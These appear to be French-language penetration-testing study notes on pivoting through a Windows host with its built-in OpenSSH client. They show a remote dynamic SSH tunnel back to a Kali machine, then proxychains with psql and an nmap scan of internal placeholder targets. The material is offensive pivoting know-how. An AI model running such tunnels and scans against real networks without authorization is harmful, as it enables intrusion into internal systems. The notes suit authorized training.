# Port Forwarding with Windows Tools

## ssh.exe (OpenSSH natif Windows)

OpenSSH est inclus par défaut depuis Windows 1803 (avril 2018). L'exécutable est dans `%SystemRoot%\System32\OpenSSH\ssh.exe`.

```powershell
where ssh
ssh -V   # doit être >= 7.6 pour le remote dynamic port forwarding
```

La syntaxe est identique au client Linux — on peut donc créer les mêmes tunnels (remote, remote dynamic, local…).

### Remote Dynamic Port Forwarding depuis Windows

```cmd
ssh -N -R 9998 kali@<IP_KALI>
```

Le proxy SOCKS s'ouvre sur `127.0.0.1:9998` côté Kali. Configurer Proxychains et utiliser le tunnel exactement comme avec un client Linux :

```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 9998

# Utilisation depuis Kali
proxychains psql -h <IP_INTERNE> -U postgres
proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
```
